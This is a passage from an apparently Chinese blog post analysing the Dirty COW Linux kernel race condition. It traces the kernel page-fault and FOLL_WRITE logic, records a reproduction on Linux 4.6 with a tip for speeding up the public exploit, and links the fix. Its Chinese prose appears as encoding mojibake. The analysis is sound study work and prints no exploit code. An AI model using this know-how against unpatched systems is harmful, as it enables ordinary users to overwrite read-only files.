maybe_mkwrite(pte_mkdirty(entry), vma);		<span class="comment">// è®¾ç½®é¡µé¢ä¸ºdirtyï¼Œä½†ä»ä¿æŒé¡µé¢ä¸ºRO		</span></span><br><span class="line">    	      <span class="comment">// if (likely(vma-&gt;vm_flags &amp; VM_WRITE))</span></span><br><span class="line">			  <span class="comment">//		pte = pte_mkwrite(pte);</span></span><br><span class="line">			  page_add_new_anon_rmap(page, vma, address, <span class="literal">false</span>);</span><br><span class="line">			  set_pte_at(vma-&gt;vm_mm, address, pte, entry);</span><br><span class="line">    	    lru_cache_add_active_or_unevictable(new_page, vma);</span><br><span class="line">  </span><br></pre></td></tr></table></div></figure>
<p><code>do_cow_fault()</code>å‡½æ•°ä¼šè¿”å›0ï¼Œå›åˆ°<code>__get_user_pages()</code>å‡½æ•°ä¸­çš„retryæ ‡ç­¾å¤„ï¼Œå†æ¬¡æ‰§è¡Œ<code>follow_page_mask()</code>å’Œ<code>faultin_page()</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">retry:</span><br><span class="line">		<span class="keyword">if</span> (unlikely(fatal_signal_pending(current)))</span><br><span class="line">			<span class="keyword">return</span> i ? i : -ERESTARTSYS;</span><br><span class="line">		cond_resched();</span><br><span class="line">		page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);			<span class="comment">// æŸ¥è¯¢é¡µè¡¨è·å–è™šæ‹Ÿåœ°å€å¯¹åº”çš„ç‰©ç†é¡µ</span></span><br><span class="line">		<span class="keyword">if</span> (!page) &#123;</span><br><span class="line">			<span class="keyword">int</span> ret;</span><br><span class="line">			ret = faultin_page(tsk, vma, start, &amp;foll_flags,				<span class="comment">// ç¼ºé¡µå¤„ç†å‡½æ•°</span></span><br><span class="line">					nonblocking);</span><br><span class="line">			<span class="keyword">switch</span> (ret) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">goto</span> retry;</span><br></pre></td></tr></table></div></figure>



        <h2 id="ç¬¬äºŒæ¬¡"   >
          <a href="#ç¬¬äºŒæ¬¡" class="heading-link"><i class="fas fa-link"></i></a><a href="#ç¬¬äºŒæ¬¡" class="headerlink" title="ç¬¬äºŒæ¬¡"></a>ç¬¬äºŒæ¬¡</h2>
      <blockquote>
<p>ç¬¬äºŒæ¬¡è¿›å…¥<code>follow_page_mask()</code>å‡½æ•°ï¼Œæ­¤æ—¶é¡µè¡¨å’Œæ˜ å°„å…³ç³»å·²å»ºç«‹å¥½ï¼Œä½†ç”±äºé¡µè¡¨æ ‡è®°ä½æ˜¯read onlyï¼Œè€Œè®¿é—®çš„flagsä¸­è¦æ±‚å†™ï¼Œå› æ­¤ä¼šè¿”å›NULLã€‚</p>
<p>äºæ˜¯å†æ¬¡è¿›å…¥<code>faultin_page()</code>å‡½æ•°å¤„ç†ï¼Œå‘ç°æ˜¯å› ä¸ºé¡µè¡¨å†™å¯¼è‡´çš„é”™è¯¯ï¼Œäºæ˜¯æ‰§è¡Œå†™æ—¶å¤åˆ¶ï¼ˆæˆ–å¤ç”¨ä¹‹å‰çš„åŒ¿åé¡µï¼‰ï¼Œç„¶åå°†flagsä¸­çš„FOLL_WRITEæ¸…é™¤ã€‚è¡¨ç¤ºæ˜ å°„æ­£å¸¸è¿”å›ï¼Œåç»­å¯ä»¥å¼ºåˆ¶å¾€è¯¥é¡µå†™ï¼ˆ<code>/proc/self/mem</code>å°±æ˜¯è¿™ä¹ˆä»»æ€§ï¼Œåªä¸è¿‡å†™çš„æ˜¯åŒ¿åé¡µï¼Œåªåœ¨ç¨‹åºè¿è¡Œå†…å­˜ä¸­æœ‰è¡¨ç°ï¼Œä¸ä¼šåŒæ­¥å›ç£ç›˜æ–‡ä»¶ï¼‰ã€‚</p>
</blockquote>
<p>ç¬¬äºŒæ¬¡è¿›å…¥<code>follow_page_mask()</code>å‡½æ•°ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">follow_page_mask(vma, start, foll_flags, &amp;page_mask);</span><br><span class="line">  pgd_offset(mm, address);</span><br><span class="line">  pud_offset(pgd, address);</span><br><span class="line">  pmd_offset(pud, address);</span><br><span class="line">  follow_page_pte(vma, address, pmd, flags);</span><br><span class="line">    pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line">    pte_present(pte);			<span class="comment">// ç¬¬äºŒæ¬¡è¿›æ—¶ï¼Œç”±äºä¸Šä¸€æ¬¡faultin_pageä¸­è®¾ç½®äº†é¡µè¡¨é¡¹å¹¶ä¸”é¡µè¢«åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œæ‰€ä»¥ä¼šè¿›å…¥å¦‚ä¸‹åˆ¤æ–­</span></span><br><span class="line">    <span class="keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;		<span class="comment">//è™½ç„¶flagsä¸­æœ‰FOLL_WRITEæ ‡è®°ä½ï¼Œä½†é¡µè¡¨é¡¹ä¸­å´æ˜¯ROï¼Œæ— æ³•é€šè¿‡æ£€æŸ¥ï¼Œå› æ­¤è¿”å›NULL</span></span><br><span class="line">		pte_unmap_unlock(ptep, ptl);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></div></figure>
<p>è¿”å›ä¸ºNULLï¼Œè§¦å‘<code>faultin_page()</code>å¤„ç†ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">faultin_page(tsk, vma, start, &amp;foll_flags, nonblocking);</span><br><span class="line">  handle_mm_fault(mm, vma, address, fault_flags);</span><br><span class="line">    __handle_mm_fault(mm, vma, address, flags);</span><br><span class="line">      pgd_offset(mm, address);</span><br><span class="line">      pud_alloc(mm, pgd, address);</span><br><span class="line">      pmd_alloc(mm, pud, address);</span><br><span class="line">      pte_alloc(mm, pmd, address)</span><br><span class="line">      pte_offset_map(pmd, address);			</span><br><span class="line">      handle_pte_fault(mm, vma, address, pte, pmd, flags);</span><br><span class="line">        <span class="comment">/* if (flags &amp; FAULT_FLAG_WRITE) &#123;</span></span><br><span class="line"><span class="comment">		if (!pte_write(entry))</span></span><br><span class="line"><span class="comment">			return do_wp_page(mm, vma, address,pte, pmd, ptl, entry);</span></span><br><span class="line"><span class="comment">			// ç”±äºæ­¤æ—¶é¡µè¡¨ä¸­æ ‡è®°ä½PRESENT=1ï¼ŒDIRTY=1ï¼ŒRDONLY=1ï¼Œæ‰€ä»¥è¿›å…¥do_wp_page()å‡½æ•°å¤„ç†æµç¨‹ */</span></span><br><span class="line">		do_wp_page(mm, vma, address, pte, pmd, ptl, entry);		</span><br><span class="line">		  vm_normal_page(vma, address, orig_pte);</span><br><span class="line">		  <span class="keyword">if</span> (PageAnon(old_page) &amp;&amp; !PageKsm(old_page)) 	<span class="comment">// ç”±äºdo_cow_faultäº§ç”Ÿçš„æ˜¯åŒ¿åé¡µé¢ï¼Œå› æ­¤ä¼šè¿›å…¥è¯¥ifåˆ†æ”¯</span></span><br><span class="line">          reuse_swap_page(old_page, &amp;total_mapcount)</span><br><span class="line">		  wp_page_reuse(mm, vma, address, page_table, ptl, orig_pte, old_page, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">		    pte_mkyoung(orig_pte);</span><br><span class="line">		    maybe_mkwrite(pte_mkdirty(entry), vma);</span><br><span class="line">		    <span class="keyword">return</span> VM_FAULT_WRITE;</span><br><span class="line">			<span class="comment">// ç”±äºå¯¹åº”VMAåªè¯», å› æ­¤åªä¼šç»™PTEè®¾ç½®ä¸€ä¸ªDirtyæ ‡å¿—, è€Œä¸ä¼šè®¾ç½®RWæ ‡å¿—, ç„¶åè¿”å›ä¸€ä¸ªVM_FAULT_WRITEï¼ˆè¡¨ç¤ºå†…æ ¸å¯ä»¥å†™å…¥è¿™ä¸ªé¡µï¼‰</span></span><br><span class="line">      <span class="comment">// ......ä¸€è·¯è¿”å›åˆ°faulin_page()å‡½æ•°ä¸­</span></span><br><span class="line">  <span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">		*flags &amp;= ~FOLL_WRITE;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// é‡ç‚¹æ¥äº†ï¼Œå¦‚æœvma-&gt;vm_flagsæ²¡æœ‰VM_WRITEæƒé™ï¼Œåˆ™å°†flagsä¸­çš„FOLL_WRITEæ¸…é™¤ </span></span><br></pre></td></tr></table></div></figure>
<p><code>do_cow_fault()</code>å‡½æ•°è¿”å›0ï¼Œå›åˆ°__get_user_pages()å‡½æ•°ä¸­çš„retryæ ‡ç­¾å¤„ï¼Œå†æ¬¡æ‰§è¡Œ<code>follow_page_mask()</code>ã€‚ä½†è¿™æ¬¡ï¼Œflagsä¸­çš„FOLL_WRITEå·²ç»è¢«æ¸…é™¤äº†ï¼Œç›¸å½“äºä¸€ä¸ªè¯»è¯·æ±‚ã€‚äºæ˜¯ï¼Œæ­£å¸¸æƒ…å†µä¸‹<code>follow_page_mask()</code>æ­¤æ—¶å°±ä¼šè¿”å›åˆšåˆšæ“ä½œè¿‡çš„åŒ¿åæ˜ å°„çš„é¡µé¢ï¼Œåç»­ç”¨æˆ·å¯¹è¯¥é¡µé¢çš„å†™ä¸ä¼šåŒæ­¥åˆ°ç£ç›˜æ–‡ä»¶ä¸­ã€‚æ­£å¸¸æ¥è¯´è¿™ä¸ªåŠŸèƒ½æ˜¯æ²¡ä»€ä¹ˆé—®é¢˜çš„ã€‚</p>
<p>ä½†æ˜¯ï¼ï¼å¦‚æœæ­¤æ—¶æœ‰å¦ä¸€ä¸ªçº¿ç¨‹å‡ºç°ï¼Œä½¿ç”¨ <code>madvise(addr, len, MADV_DONTNEED)</code> é‡Šæ”¾ç›®æ ‡é¡µé¢ï¼Œå¹¶æ¸…ç©ºé¡µè¡¨é¡¹ï¼Œåç»­å°±ä¼šä»¥FOLL_RAEDå†èµ°ä¸€æ¬¡<code>follow_page_mask()</code> -&gt; <code>faultin_page</code> -&gt; <code>follow_page_mask()</code> -&gt; è¿”å›page cacheæ˜ å°„çš„é¡µé¢ï¼ˆä¹Ÿå°±æ˜¯è¯´å†™çš„å†…å®¹ä¼šè¢«åŒæ­¥åˆ°ç£ç›˜æ–‡ä»¶ä¸­ï¼‰ã€‚å›åˆ°<code>__access_remote_vm()</code>ä¸­ï¼Œè°ƒç”¨<code>kmap()</code>æ˜ å°„è¿”å›çš„é¡µé¢ï¼Œç”±äºwriteæ ‡å¿—ä¸º1ï¼Œè¿›å…¥<code>copy_to_user_page()</code>ï¼Œå°†éœ€è¦å†™å…¥çš„å†…å®¹å†™åˆ°åªè¯»æ–‡ä»¶ä¸­ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åˆ†æä¸€ä¸‹ç›®æ ‡é¡µé¢è¢«<code>madvise()</code>é‡Šæ”¾åçš„è¿‡ç¨‹</p>

        <h2 id="ç¬¬ä¸‰æ¬¡"   >
          <a href="#ç¬¬ä¸‰æ¬¡" class="heading-link"><i class="fas fa-link"></i></a><a href="#ç¬¬ä¸‰æ¬¡" class="headerlink" title="ç¬¬ä¸‰æ¬¡"></a>ç¬¬ä¸‰æ¬¡</h2>
      <blockquote>
<p>å‡è®¾ç¬¬ä¸‰æ¬¡è¿›å…¥<code>follow_page_mask()</code>å‡½æ•°å‰ï¼Œaddresså¯¹åº”çš„ç‰©ç†é¡µè¢«é‡Šæ”¾ä¸”å¯¹åº”çš„é¡µè¡¨é¡¹è¢«æ¸…ç©ºäº†ã€‚è€Œflagsä¸­æ²¡æœ‰POLL_WRITEï¼Œä¼šè¿›å…¥è¯»é”™è¯¯çš„ç¼ºé¡µé”™è¯¯å¤„ç†è¿‡ç¨‹ã€‚è¿™ä¸ªè¿‡ç¨‹ä¸ä¼šäº§ç”ŸåŒ¿åé¡µé¢ï¼Œç›´æ¥å°†page_cacheæ˜ å°„åˆ°è™šæ‹Ÿå†…å­˜ç©ºé—´ï¼Œåç»­çš„è¯»å†™ä¼šåŒæ­¥å›ç£ç›˜æ–‡ä»¶ï¼ˆè¿™å°±æ˜¯æ¼æ´å¯¼è‡´çš„é—®é¢˜æ‰€åœ¨ï¼‰ã€‚</p>
</blockquote>
<p>ç¬¬ä¸‰æ¬¡è¿›å…¥<code>follow_page_mask()</code>å‡½æ•°ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">follow_page_mask(vma, start, foll_flags, &amp;page_mask);</span><br><span class="line">  pgd_offset(mm, address);</span><br><span class="line">  pud_offset(pgd, address);</span><br><span class="line">  pmd_offset(pud, address);</span><br><span class="line">  follow_page_pte(vma, address, pmd, flags);</span><br><span class="line">  	pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line">  	pte_present(pte);			<span class="comment">// ç¬¬ä¸‰æ¬¡è¿›æ—¶ï¼Œç”±äºmadivseæ“ä½œå°†é¡µè¡¨æ¸…ç©ºäº†ï¼Œé¡µä¸åœ¨å†…å­˜ä¸­ï¼Œä¸”é¡µè¡¨é¡¹ä¸ºç©ºï¼Œä¼šç›´æ¥è¿”å›NULL</span></span><br><span class="line">  	<span class="keyword">if</span> (!pte_none(pte))</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></div></figure>
<p>è¿”å›ä¸ºNULLï¼Œè§¦å‘<code>faultin_page()</code>å¤„ç†ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">faultin_page(tsk, vma, start, &amp;foll_flags, nonblocking);</span><br><span class="line">  handle_mm_fault(mm, vma, address, fault_flags);</span><br><span class="line">    __handle_mm_fault(mm, vma, address, flags);</span><br><span class="line">      pgd_offset(mm, address);</span><br><span class="line">      pud_alloc(mm, pgd, address);</span><br><span class="line">      pmd_alloc(mm, pud, address);</span><br><span class="line">      pte_alloc(mm, pmd, address)</span><br><span class="line">      pte_offset_map(pmd, address);</span><br><span class="line">      handle_pte_fault(mm, vma, address, pte, pmd, flags);</span><br><span class="line">        do_fault(mm, vma, address, pte, pmd, flags, entry);</span><br><span class="line">		  <span class="comment">// ç”±äºflagsä¸­çš„WRITEæ ‡è®°æ²¡äº†ï¼Œäºæ˜¯ä¼šè¿›å…¥do_read_fault()</span></span><br><span class="line">    	  do_read_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);</span><br><span class="line">  		  <span class="comment">// do_read_faultå°†æ–‡ä»¶å†…å®¹è¯»å–åˆ°vmf-&gt;pageé¡µé¢ï¼ˆpage cacheï¼‰ï¼Œå¹¶ä¸ºæ­¤ç‰©ç†é¡µé¢å»ºç«‹ä¸ç¼ºé¡µåœ°å€çš„æ˜ å°„å…³ç³»ã€‚è¿”å›0</span></span><br></pre></td></tr></table></div></figure>



        <h2 id="ç¬¬å››æ¬¡"   >
          <a href="#ç¬¬å››æ¬¡" class="heading-link"><i class="fas fa-link"></i></a><a href="#ç¬¬å››æ¬¡" class="headerlink" title="ç¬¬å››æ¬¡"></a>ç¬¬å››æ¬¡</h2>
      <blockquote>
<p><code>follow_page_mask()</code>è¿”å›è·å–åˆ°çš„ç‰©ç†é¡µé¢ç»™ä¸Šå±‚å‡½æ•°ï¼Œä¸ä¼šå†è¿›å…¥ç¼ºé¡µå¤„ç†å‡½æ•°ã€‚</p>
</blockquote>
<p>å›åˆ°<code>__get_user_pages()</code>å‡½æ•°ä¸­çš„retryæ ‡ç­¾å¤„ï¼Œå†æ¬¡æ‰§è¡Œ<code>follow_page_mask()</code>ï¼Œè¿™æ¬¡å°±èƒ½è·å¾—page_cacheå¯¹åº”çš„é¡µé¢ï¼Œå¯¹å…¶å†™æ˜¯ä¼šç›´æ¥åŒæ­¥åˆ°æ–‡ä»¶ä¸­çš„ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">follow_page_mask(vma, start, foll_flags, &amp;page_mask);</span><br><span class="line">  pgd_offset(mm, address);</span><br><span class="line">  pud_offset(pgd, address);</span><br><span class="line">  pmd_offset(pud, address);</span><br><span class="line">  follow_page_pte(vma, address, pmd, flags);</span><br><span class="line">  	pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line">  	pte_present(pte);			<span class="comment">// ç¬¬å››æ¬¡è¿›æ—¶ï¼Œç”±äºé¡µåœ¨å†…å­˜ä¸­ï¼Œäºæ˜¯è·å–é¡µé¢å¹¶è¿”å›</span></span><br><span class="line">  	page = vm_normal_page(vma, address, pte);</span><br></pre></td></tr></table></div></figure>



        <h2 id="æœ€ç»ˆ"   >
          <a href="#æœ€ç»ˆ" class="heading-link"><i class="fas fa-link"></i></a><a href="#æœ€ç»ˆ" class="headerlink" title="æœ€ç»ˆ"></a>æœ€ç»ˆ</h2>
      <p>ç´§æ¥ç€ï¼Œè¿”å›åˆ°<code>__access_remote_vm()</code>å‡½æ•°ä¸­ï¼Œé€šè¿‡<code>kmap()</code>æ˜ å°„ç»•è¿‡mmapæ˜ å°„çš„è¯»å†™é™åˆ¶ï¼Œå®Œæˆå¼ºåˆ¶å†™å†…å­˜ã€‚ï¼ˆä¸å¹¸çš„æ˜¯ï¼Œç”±äºæ¡ä»¶ç«äº‰æ¼æ´çš„å­˜åœ¨ï¼Œè¿™ä¸ªå†…å­˜å†™ä¼šè¢«åŒæ­¥åˆ°ç£ç›˜æ–‡ä»¶ä¸­ï¼‰</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ret = get_user_pages_remote(tsk, mm, addr, <span class="number">1</span>, write, <span class="number">1</span>, &amp;page, &amp;vma);		<span class="comment">// è·å–è™šæ‹Ÿåœ°å€addrå¯¹åº”çš„ç‰©ç†é¡µé¢page</span></span><br><span class="line"><span class="keyword">if</span> (ret &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">	maddr = kmap(page);		<span class="comment">// ç”¨äºç›¸å¯¹çŸ­æ—¶é—´çš„æ˜ å°„ï¼Œåªèƒ½æ˜ å°„å•ä¸ªpageã€‚</span></span><br><span class="line">	<span class="keyword">if</span> (write) &#123;</span><br><span class="line">		copy_to_user_page(vma, page, addr, maddr + offset, buf, bytes);		<span class="comment">// å°†bufå†…å®¹ï¼ˆç”¨æˆ·æ€ä¼ å…¥çš„æ•°æ®ï¼‰å†™å…¥page cache</span></span><br><span class="line">		set_page_dirty_lock(page);		<span class="comment">// å› ä¸ºæ˜¯å†™ï¼Œæ‰€ä»¥å°†pageè®¾ç½®ä¸ºè„ï¼ˆdirty bitï¼‰ï¼Œè¡¨ç¤ºéœ€è¦å†™å›åˆ°æ–‡ä»¶</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		copy_from_user_page(vma, page, addr,</span><br><span class="line">				    buf, maddr + offset, bytes);</span><br><span class="line">	&#125;</span><br><span class="line">          kunmap(page);</span><br><span class="line">	put_page(page);</span><br><span class="line">          <span class="comment">// ...</span></span><br></pre></td></tr></table></div></figure>
<p>åç»­åŒæ­¥æ—¶ï¼Œå°±ä¼šå°†page cacheä¿®æ”¹è¿‡çš„å†…å®¹å†™å›åˆ°ç£ç›˜æ–‡ä»¶ä¸­å»ã€‚ï¼ˆï¼Ÿå…·ä½“çš„å†™å›æ—¶æœºæ˜¯ï¼Ÿï¼‰</p>

        <h2 id="æ€»ç»“"   >
          <a href="#æ€»ç»“" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2>
      <p>ç²¾ç®€ä¸€ä¸‹æµç¨‹ï¼Œæ–¹ä¾¿å›å¤´æ¥çœ‹çš„æ—¶å€™å¿«é€Ÿç†è§£ã€‚</p>
<p>æ­£å¸¸è°ƒç”¨æµç¨‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">follow_page_mask()		<span class="comment">// é¡µæœªæ˜ å°„ï¼Œè¿”å›NULL</span></span><br><span class="line">	â¬‡</span><br><span class="line">faultin_page()			<span class="comment">// å°†æ–‡ä»¶å†…å®¹è¯»åˆ°page cacheï¼Œå¹¶cowä¸€ä¸ªåŒ¿åé¡µé¢ï¼ˆROï¼‰</span></span><br><span class="line">	â¬‡</span><br><span class="line">follow_page_mask()		<span class="comment">// ç”±äºè®¿é—®å±æ€§flagsä¸­æœ‰FOLL_WRITEï¼Œè€ŒåŒ¿åé¡µé¢åªè¯»ã€‚æƒé™ä¸åŒ¹é…ï¼Œè¿”å›NULL</span></span><br><span class="line">	â¬‡</span><br><span class="line">faultin_page()			<span class="comment">// ä¸€é¡¿å¤„ç†ï¼ŒçŸ¥é“æ˜¯åŒ¿åé¡µé¢ï¼Œæ‰€ä»¥åˆ é™¤äº†flagsä¸­æœ‰FOLL_WRITE</span></span><br><span class="line">	â¬‡		</span><br><span class="line">follow_page_mask()		<span class="comment">// æ²¡äº†FOLL_WRITEåï¼Œæƒé™æ£€æŸ¥é€šè¿‡ï¼ŒæˆåŠŸè·å–åˆ°åŒ¿åé¡µé¢page</span></span><br><span class="line">	â¬‡</span><br><span class="line">è¿”å›ä¸Šä¸€çº§å‡½æ•°				<span class="comment">// ä¸Šä¸€çº§å‡½æ•°å¯¹è¿™ä¸ªåŒ¿åé¡µé¢é€šè¿‡kmapåšå†™æ“ä½œï¼Œä¸ä¼šå½±å“åˆ°ç£ç›˜æ–‡ä»¶</span></span><br></pre></td></tr></table></div></figure>
<p>dirtycowè°ƒç”¨æµç¨‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">follow_page_mask()		<span class="comment">// é¡µæœªæ˜ å°„ï¼Œè¿”å›NULL</span></span><br><span class="line">	â¬‡</span><br><span class="line">faultin_page()			<span class="comment">// å°†æ–‡ä»¶å†…å®¹è¯»åˆ°page cacheï¼Œå¹¶cowä¸€ä¸ªåŒ¿åé¡µé¢ï¼ˆROï¼‰</span></span><br><span class="line">	â¬‡</span><br><span class="line">follow_page_mask()		<span class="comment">// ç”±äºè®¿é—®å±æ€§flagsä¸­æœ‰FOLL_WRITEï¼Œè€ŒåŒ¿åé¡µé¢åªè¯»ã€‚æƒé™ä¸åŒ¹é…ï¼Œè¿”å›NULL</span></span><br><span class="line">	â¬‡</span><br><span class="line">faultin_page()			<span class="comment">// ä¸€é¡¿å¤„ç†ï¼ŒçŸ¥é“æ˜¯åŒ¿åé¡µé¢ï¼Œæ‰€ä»¥åˆ é™¤äº†flagsä¸­æœ‰FOLL_WRITE</span></span><br><span class="line">	â¬‡		<span class="comment">// ***å‡è®¾å¦ä¸€ä¸ªçº¿ç¨‹åœ¨è¿™é‡Œé‡Šæ”¾äº†åŒ¿åé¡µé¢ï¼Œå¹¶æ¸…ç©ºäº†é¡µè¡¨é¡¹</span></span><br><span class="line">follow_page_mask()		<span class="comment">// é¡µä¸ºæ˜ å°„ï¼Œè¿”å›NULL ï¼ˆæ³¨æ„ï¼Œæ­¤æ—¶flagsä¸­æ²¡æœ‰äº†FOLL_WRITEï¼Œç¼–ç¨‹äº†ä¸€ä¸ªè¯»è¯·æ±‚ï¼‰</span></span><br><span class="line">	â¬‡</span><br><span class="line">faultin_page()			<span class="comment">// é’ˆå¯¹è¯»è¯·æ±‚ï¼Œç›´æ¥å°†page cacheè·Ÿè¯·æ±‚çš„è™šæ‹Ÿåœ°å€åšæ˜ å°„</span></span><br><span class="line">	â¬‡</span><br><span class="line">follow_page_mask()		<span class="comment">// æˆåŠŸè¿”å›page cache</span></span><br><span class="line">	â¬‡</span><br><span class="line">è¿”å›ä¸Šä¸€çº§å‡½æ•°				<span class="comment">// ä¸Šä¸€çº§å‡½æ•°å¯¹page cacheé€šè¿‡kmapåšå†™æ“ä½œï¼Œä¼šæ”¹å†™ç£ç›˜æ–‡ä»¶å†…å®¹</span></span><br></pre></td></tr></table></div></figure>



        <h1 id="å¤ç°ç¯å¢ƒ"   >
          <a href="#å¤ç°ç¯å¢ƒ" class="heading-link"><i class="fas fa-link"></i></a><a href="#å¤ç°ç¯å¢ƒ" class="headerlink" title="å¤ç°ç¯å¢ƒ"></a>å¤ç°ç¯å¢ƒ</h1>
      <p>åœ¨<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.6.tar.gz" >linux4.6</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>ç¼–è¯‘çš„å†…æ ¸ä¸‹å¤ç°æˆåŠŸï¼Œä¸€ä¸ªåŸæœ¬åªè¯»çš„æ–‡ä»¶è¢«æ™®é€šç”¨æˆ·ä¿®æ”¹æˆåŠŸã€‚</p>
<ul>
<li>å†™å…¥å­—ç¬¦ä¸²çš„é•¿åº¦å¦‚æœå¤§äºæ–‡ä»¶å¤§å°ï¼Œæœ€å¤šåªèƒ½å†™å…¥æ–‡ä»¶å¤§å°ä¸ªå­—ç¬¦</li>
<li>å®˜æ–¹expä¸­forå¾ªç¯è®¾ç½®äº†100000000æ¬¡ï¼Œå¾ˆæ…¢ã€‚æµ‹è¯•äº†ä¸€ä¸‹ï¼Œæˆ‘çš„ç¯å¢ƒé‡Œæ”¹æˆ100000ä¹Ÿèƒ½æ‰“æˆï¼Œä¼šå¿«å¾ˆå¤šã€‚</li>
</ul>
<p><img   src="image-20230425175820639.png?size=600" style="width: 600px;"  alt="image-20230425175820639"></p>

        <h1 id="æ¼æ´ä¿®å¤"   >
          <a href="#æ¼æ´ä¿®å¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h1>
      <p>patchï¼š<a target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619"><strong>mm: remove gup_flags FOLL_WRITE games from __get_user_pages()</strong></a></p>
